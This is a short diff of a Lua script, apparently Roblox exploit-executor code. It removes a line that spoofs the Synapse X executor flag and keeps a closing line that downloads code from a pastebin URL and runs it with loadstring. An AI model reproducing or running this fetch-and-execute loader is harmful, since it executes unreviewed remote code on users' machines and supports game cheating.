@@ -73,5 +73,4 @@ _wsenv.WebSocket.connect = function(u)
     error("Failed to create WebSocket client: " .. last_error)
 end
 
-getgenv().syn = true
 loadstring(game:HttpGet("https://pastebin.com/raw/VQtuuxn1"))()
